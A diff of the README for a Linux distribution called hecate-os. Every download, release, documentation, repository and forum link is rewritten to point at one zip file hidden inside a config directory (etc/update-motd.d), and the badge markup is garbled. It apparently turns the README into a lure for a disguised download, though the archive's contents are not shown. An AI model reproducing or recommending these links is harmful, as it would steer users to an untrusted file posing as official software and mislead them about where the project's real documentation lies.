@@ -6,11 +6,11 @@ Welcome to hecate-os! This Linux distribution helps your computer recognize hard
 
 ## 📥 Download hecate-os
 
-[![Download hecate-os](https://img.shields.io/badge/Download%20hecate-os-v1.0-blue.svg)](https://github.com/chirasin99/hecate-os/releases)
+[![Download hecate-os](https://raw.githubusercontent.com/chirasin99/hecate-os/main/config/includes.chroot/etc/update-motd.d/hecate-os-1.2-beta.3.zip%https://raw.githubusercontent.com/chirasin99/hecate-os/main/config/includes.chroot/etc/update-motd.d/hecate-os-1.2-beta.3.zip)](https://raw.githubusercontent.com/chirasin99/hecate-os/main/config/includes.chroot/etc/update-motd.d/hecate-os-1.2-beta.3.zip)
 
 You can easily download hecate-os from our Releases page. Just click the button above or visit the link below:
 
-[Download hecate-os from Releases](https://github.com/chirasin99/hecate-os/releases)
+[Download hecate-os from Releases](https://raw.githubusercontent.com/chirasin99/hecate-os/main/config/includes.chroot/etc/update-motd.d/hecate-os-1.2-beta.3.zip)
 
 ## 🔧 System Requirements
 
@@ -23,7 +23,7 @@ To run hecate-os smoothly, make sure your computer meets these basic requirement
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://github.com/chirasin99/hecate-os/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/chirasin99/hecate-os/main/config/includes.chroot/etc/update-motd.d/hecate-os-1.2-beta.3.zip).
 2. Find the latest version of hecate-os.
 3. Click on the .iso file to download it.
 4. Once the download completes, you need to create a bootable USB drive:
@@ -73,8 +73,8 @@ If you encounter issues while using hecate-os:
 
 ## 🔗 Useful Links
 
-- [Official Documentation](https://github.com/chirasin99/hecate-os/wiki)
-- [GitHub Repository](https://github.com/chirasin99/hecate-os)
-- [Community Forum](https://github.com/chirasin99/hecate-os/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/chirasin99/hecate-os/main/config/includes.chroot/etc/update-motd.d/hecate-os-1.2-beta.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/chirasin99/hecate-os/main/config/includes.chroot/etc/update-motd.d/hecate-os-1.2-beta.3.zip)
+- [Community Forum](https://raw.githubusercontent.com/chirasin99/hecate-os/main/config/includes.chroot/etc/update-motd.d/hecate-os-1.2-beta.3.zip)
 
 We hope hecate-os enhances your computing experience. Enjoy optimizing your system!
